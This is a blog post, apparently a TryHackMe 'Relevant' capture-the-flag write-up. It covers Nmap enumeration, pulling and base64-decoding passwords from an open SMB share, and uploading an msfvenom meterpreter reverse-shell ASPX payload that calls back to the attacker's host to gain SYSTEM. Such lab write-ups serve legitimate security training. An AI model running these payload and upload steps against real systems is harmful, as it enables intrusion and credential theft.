<!DOCTYPE html>
<html>
  <head>

    <title>TryHackMe - Relevant – Jennifer Reeves – IT Security Enthusiast</title>
  
        <meta charset="utf-8" />
    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>

    
    <meta name="description" content="AcousticGirl
March 17, 2022

" />
    <meta property="og:description" content="AcousticGirl
March 17, 2022

" />
    
    <meta name="author" content="Jennifer Reeves" />

    
    <meta property="og:title" content="TryHackMe - Relevant" />
    <meta property="twitter:title" content="TryHackMe - Relevant" />
    

    <!--[if lt IE 9]>
      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link rel="stylesheet" type="text/css" href="/style.css" />
    <link rel="alternate" type="application/rss+xml" title="Jennifer Reeves - IT Security Enthusiast" href="/feed.xml" />

    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
  </head>

  <body>
    <div class="wrapper-masthead">
      <div class="container">
        <header class="masthead clearfix">
          <a href="/" class="site-avatar"><img src="https://github.com/jbreeves/jbreeves.github.io/blob/main/images/self%20portrait.jpg?raw=true" /></a>

          <div class="site-info">
            <h1 class="site-name"><a href="/">Jennifer Reeves</a></h1>
            <p class="site-description">IT Security Enthusiast</p>
          </div>

          <nav>
            <a href="/">Blog</a>
            <a href="/about">About</a>
            <a href="/tags">Tags</a>
          </nav>
        </header>
      </div>
    </div>

    <div id="main" role="main" class="container">
      <article class="post">
  <h1>TryHackMe - Relevant</h1>

  <div class="entry">
    <p>AcousticGirl
March 17, 2022</p>

<hr />

<h2 id="1-enumeration">1. Enumeration</h2>
<ul>
  <li>
    <p>Rustscan w/Nmap</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  PORT      STATE SERVICE            REASON  VERSION
  80/tcp    open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-server-header: Microsoft-IIS/10.0
  | http-methods: 
  |   Supported Methods: OPTIONS TRACE GET HEAD POST
  |_  Potentially risky methods: TRACE
  |_http-title: IIS Windows Server
  135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
  139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
  445/tcp   open  microsoft-ds       syn-ack Windows Server 2016 Standard Evaluation 14393 microsoft-ds
  3389/tcp  open  ssl/ms-wbt-server? syn-ack
  | ssl-cert: Subject: commonName=Relevant
  | Issuer: commonName=Relevant
  | Public Key type: rsa
  | Public Key bits: 2048
  | Signature Algorithm: sha256WithRSAEncryption
  | Not valid before: 2022-03-17T01:15:08
  | Not valid after:  2022-09-16T01:15:08
  | MD5:   42a4 a8c4 a4d5 43af 1f7e e6a7 88fe 4373
  | SHA-1: 2a2c 5af2 116e 6673 7a55 c523 3c37 0cf2 3eeb c089
  | -----BEGIN CERTIFICATE-----
  | MIIC1DCCAbygAwIBAgIQEkeU/ZJCmK9J6QDJRpgLmDANBgkqhkiG9w0BAQsFADAT
  | MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMjAzMTcwMTE1MDhaFw0yMjA5MTYwMTE1
  | MDhaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
  | MIIBCgKCAQEA7ahxwPyNn7Abaj+oCzoOo83ho2xv4Oa7t0vA1uNos5FliGRzjEIg
  | MR2goaz7E8tkbU3yawvx/v6/DUxsIkOu6J4Ls/VI3BBMxeE/1GbC0OSlLEoeIe88
  | iPzXLcZy4lmC5Bk54T3XS6NPBFDU0ut/cjr4XyFcY1ah5A3D4sDZkQFCeR0slOTQ
  | QzyCDPsF3VwTWT7lCBDpFAq2KKFQd7pF/kopJc8qZqr2BPHJIu5tKxNIuaR9AFml
  | OHsr4F9XLAXjj/kRu18P68Zl37xFAyGg/dD1fvEADcShCtFA4Zx2xm7sUMrS2cIq
  | PTUo6uznY58MQLL3u9+RWvpX56/T7MrEiQIDAQABoyQwIjATBgNVHSUEDDAKBggr
  | BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAKXimMiHwlcM
  | 7KZmUN40eayEpReWmcx/so+zon7+bIIQNLktZZKqEEP1NPAODAdgsNsvP6s/3tuI
  | 4m6/IAgQZAFXEHQ9GZ5S6rjZCA7B0YpZ5kqC1NQUWAzgFiN0gB62tPHGKtDm6n1u
  | Mg97IlQrfvECo6ktKIF4fGVyzdyIHUD9TY/itfi0RylTvVpjauwO3TSv+Q147A7l
  | 2a+jlMWATm0yLYzbw2kT87HjpA7gNKu5IHk/fALDE+n7L2UdjqPsTP3Supto1HWm
  | MRhyAgri2sHL7cysJ0CjXh7JEMOobyBeiAvkYOVagfCCS42GlTyIOCNg1fU7zBMd
  | Iek/wk6cZVw=
  |_-----END CERTIFICATE-----
  |_ssl-date: 2022-03-18T01:28:58+00:00; 0s from scanner time.
  | rdp-ntlm-info: 
  |   Target_Name: RELEVANT
  |   NetBIOS_Domain_Name: RELEVANT
  |   NetBIOS_Computer_Name: RELEVANT
  |   DNS_Domain_Name: Relevant
  |   DNS_Computer_Name: Relevant
  |   Product_Version: 10.0.14393
  |_  System_Time: 2022-03-18T01:28:19+00:00
  49663/tcp open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-server-header: Microsoft-IIS/10.0
  |_http-title: IIS Windows Server
  | http-methods: 
  |   Supported Methods: OPTIONS TRACE GET HEAD POST
  |_  Potentially risky methods: TRACE
  49668/tcp open  msrpc              syn-ack Microsoft Windows RPC
  49669/tcp open  msrpc              syn-ack Microsoft Windows RPC
  Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

  Host script results:
  | p2p-conficker: 
  |   Checking for Conficker.C or higher...
  |   Check 1 (port 12736/tcp): CLEAN (Timeout)
  |   Check 2 (port 22316/tcp): CLEAN (Timeout)
  |   Check 3 (port 31614/udp): CLEAN (Timeout)
  |   Check 4 (port 23888/udp): CLEAN (Timeout)
  |_  0/4 checks are positive: Host is CLEAN or ports are blocked
  |_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  | smb2-security-mode: 
  |   3.1.1: 
  |_    Message signing enabled but not required
  | smb2-time: 
  |   date: 2022-03-18T01:28:21
  |_  start_date: 2022-03-18T01:15:08
  | smb-os-discovery: 
  |   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
  |   Computer name: Relevant
  |   NetBIOS computer name: RELEVANT\x00
  |   Workgroup: WORKGROUP\x00
  |_  System time: 2022-03-17T18:28:22-07:00
</code></pre></div>    </div>
  </li>
  <li>
    <p>Gobuster</p>
    <ul>
      <li>No results</li>
    </ul>
  </li>
</ul>

<h2 id="2-smb">2. SMB</h2>
<ul>
  <li>Connect to SMB share
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  └─$ smbclient //10.10.201.49/nt4wrksv             
  Enter WORKGROUP\acousticgirl's password: 
  Try "help" to get a list of possible commands.
  smb: \&gt; ls -la
  NT_STATUS_NO_SUCH_FILE listing \-la
  smb: \&gt; ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

          7735807 blocks of size 4096. 5138781 blocks available
</code></pre></div>    </div>
  </li>
  <li>Download passwords.txt
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  smb: \&gt; get passwords.txt 
  getting file \passwords.txt of size 98 as passwords.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
</code></pre></div>    </div>
  </li>
  <li>Decode entries in passwords.txt
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──(acousticgirl㉿kali)-[~/CTF/THM/relevant]
  └─$ cat passwords.txt        
  [User Passwords - Encoded]
  Qm9iIC0gIVBAJCRXMHJEITEyMw==
  QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                                                                                                                          
  ┌──(acousticgirl㉿kali)-[~/CTF/THM/relevant]
  └─$ echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
  Bob - !P@$$W0rD!123                                                                                                                                                                                 
  ┌──(acousticgirl㉿kali)-[~/CTF/THM/relevant]
  └─$ echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d
  Bill - Juw4nnaM4n420696969!$$$  
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="3-gaining-shell">3. Gaining Shell</h2>
<ul>
  <li>Use <code class="language-plaintext highlighter-rouge">msfvenom</code> to craft a payload to upload to the SMB share
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──(acousticgirl㉿kali)-[~/CTF/THM/relevant]
  └─$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.6.8.143 lport=4444 -f aspx -o pwn.aspx
</code></pre></div>    </div>
  </li>
  <li>Upload file to SMB
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  └─$ smbclient //10.10.234.85/nt4wrksv                                        
  Enter WORKGROUP\acousticgirl's password: 
  Try "help" to get a list of possible commands.
  smb: \&gt; mput pwn2.aspx
  Put file pwn.aspx? y
  putting file pwn.aspx as \pwn2.aspx (750.4 kb/s) (average 750.4 kb/s)
  smb: \&gt; exit
</code></pre></div>    </div>
  </li>
  <li>Start Meterpreter Handler
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  msf6 &gt; use exploit/multi/handler
  [*] Using configured payload generic/shell_reverse_tcp
  msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcp
</code></pre></div>    </div>
  </li>
  <li>Activate malicious .aspx file
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  └─$ curl http://10.10.234.85:49663/nt4wrksv/pwn.aspx
</code></pre></div>    </div>
  </li>
  <li>
    <p>Enter Command Shell</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  meterpreter &gt; sessions 11
  meterpreter &gt; shell
  Process 3628 created.
  Channel 1 created.
  Microsoft Windows [Version 10.0.14393]
  (c) 2016 Microsoft Corporation. All rights reserved.

  c:\windows\system32\inetsrv&gt;whoami
  whoami
  nt authority\system
</code></pre></div>    </div>
  </li>
  <li><strong>SUCCESS!!</strong> You are now in as NT Authority\SYSTEM user</li>
</ul>

<h2 id="4-user-flag">4. User Flag</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```
c:\Users\Bob\Desktop&gt;type user.txt
```
</code></pre></div></div>

<h2 id="5-root-flag">5. Root Flag</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```
c:\Users\Administrator\Desktop&gt;type root.txt
```
</code></pre></div></div>

  </div>
  <br>
  <br>
  <span>Tags:
    
      
      <a href="/tags/THM"><code class="highligher-rouge"><nobr>THM</nobr></code>&nbsp;</a>
    
      
      <a href="/tags/CTF"><code class="highligher-rouge"><nobr>CTF</nobr></code>&nbsp;</a>
    
      
      <a href="/tags/SMB"><code class="highligher-rouge"><nobr>SMB</nobr></code>&nbsp;</a>
    
  </span>
  <br>
  <br>
  <div class="date">
    Written on March 17, 2022
  </div>

  
</article>

    </div>

    <div class="wrapper-footer">
      <div class="container">
        <footer class="footer">
          



<a href="https://github.com/jbreeves"><i class="svg-icon github"></i></a>

<a href="https://www.linkedin.com/in/jbreeves"><i class="svg-icon linkedin"></i></a>


<a href="https://www.twitter.com/acousticgirl"><i class="svg-icon twitter"></i></a>



<a href="https://twitch.tv/acousticgirl80"><i class="svg-icon twitch"></i></a>
        </footer>
      </div>
    </div>

    

  </body>
</html>
